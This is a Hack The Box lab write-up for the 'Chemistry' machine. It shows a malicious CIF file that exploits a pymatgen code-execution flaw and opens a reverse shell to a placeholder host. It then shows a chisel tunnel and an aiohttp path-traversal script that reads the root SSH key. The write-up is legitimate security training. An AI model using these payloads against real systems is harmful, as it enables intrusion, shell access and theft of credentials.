---
date: 2025-03-07T19:59:10-06:00
# description: ""
image: "/images/HTB-Chemistry/Chemistry.png"
lastmod: 2025-03-07
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Chemistry"
type: "post"
---

* Platform: Hack The Box
* Link: [Chemistry](https://app.hackthebox.com/machines/Chemistry)
* Level: Easy
* OS: Linux
---

Chemistry starts with a file analyzer processing CIF files. Exploiting `CVE-2024-23346`, we gain an initial foothold by uploading a malicious CIF file. On the target, we discover a database file containing a password hash, enabling us to pivot to another user. Further enumeration reveals an internal website, which we access via tunneling. The website is vulnerable to `CVE-2024-23334`, allowing us to retrieve the root SSH key and complete the exploitation.

## Scanning

```
nmap -sC -sV -oA nmap/Chemistry {TARGET_IP}
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 12:47 CST
Nmap scan report for 10.10.11.38
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)

5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Thu, 23 Jan 2025 18:48:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=1/23%Time=67928EB5%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Thu,\x2023\x20Jan\x202025\x2018:48:53\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.38 seconds
```

We have two open ports:
* 22 - SSH
* 5000 - nmap is unable to accurately determine the service

## Enumeration

At `http://10.10.11.38:5000/` we find a file analyzer.

![Chemistry website](/images/HTB-Chemistry/chemistry_website.png)

After registering an account we find a Dashboard where we can upload a CIF file, a sample file is also provided.

![Chemistry Dashboard](/images/HTB-Chemistry/chemistry_dashboard.png)

## Initial Foothold (shell as app)

Searching `Malicious CIF file` on Google we find [CVE-2024-23346](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346) with a PoC [here](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f). Below is the content of our malicious CIF file.

```python
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/{IP}/{PORT} 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

After uploading the file, use the `View` button to execute it.

![malicious CIF file](/images/HTB-Chemistry/bad_CIF.png)

We get a connection on our listener as `app`.

![foothold on Chemistry](/images/HTB-Chemistry/foothold.png)

### Shell as rosa

There is another user called `rosa`.

![users list](/images/HTB-Chemistry/user_list.png)

Inside `/home/app/instance` we find `database.db` which contains the hashes of users. The admin hash is not crackable but we successfully recover `rosa` password, `unicorniosrosados`.

![database credentials](/images/HTB-Chemistry/creds_in_db.png)

![rosa password found](/images/HTB-Chemistry/rosa_pwd.png)

With this password we login as `rosa` via SSH and recover the user flag.

![rosa SSH](/images/HTB-Chemistry/rosa_SSH.png)

![Chemistry user flag](/images/HTB-Chemistry/user_flag.png)

Using linpeas we find an internal port, we will use chisel for the tunneling.

![Chemistry internal ports](/images/HTB-Chemistry/active_ports.png)

On our local machine
```
chisel server -p 9999 --reverse
```

On the target
```
./chisel client {KALI_IP}:9999 R:8080:127.0.0.1:8080
```

We go to `http://127.0.0.1:8080/` and discover a website.

![internal website](/images/HTB-Chemistry/internal_website.png)

## Privilege Escalation (shell as root)

This website is static and does not offer any exploitable functionalities. Let's use `curl` to check the headers.

```
curl 127.0.0.1:8080 --head
```

![internal website header](/images/HTB-Chemistry/aiohttp.png)

We notice [aiohttp](https://docs.aiohttp.org/en/stable/) mentioned, this is a `Async HTTP client/server for asyncio and Python`. Searching `aiohttp cve` leads to [CVE-2024-23334](https://nvd.nist.gov/vuln/detail/cve-2024-23334) with a PoC [here](https://github.com/z3rObyte/CVE-2024-23334-PoC).

The `static`  directory is not present on our target.

![no static directory](/images/HTB-Chemistry/no_static_dir.png)

So we proceed with some directory brute forcing on the internal website and find `/assets`.

![directory brute forcing on internal website](/images/HTB-Chemistry/gobuster_internal_website.png)

The vulnerabity is exploited through LFI and we can test that ourselves. After capturing a request, we successfully exploit the LFI vulnerability to read the `/etc/passwd` file.

![LFI vulnerability](/images/HTB-Chemistry/LFI_vuln.png)

By adjusting the payload to `/assets/../../../../root/.ssh/id_rsa` we obtain the root SSH key.

![root SSH key leaked](/images/HTB-Chemistry/root_ssh_key.png)

Using the key we can now login as root.

```
ssh -i id_rsa root@chemistry.htb
```

![root flag](/images/HTB-Chemistry/root_flag.png)

### Automated LFI

We can modify the exploit script accordingly to make it work.

> We change the port number in `url`, the `payload` and `file` values.

```bash
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/.ssh/id_rsa" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

![automated LFI in AioHTTP](/images/HTB-Chemistry/auto_LFI.png)








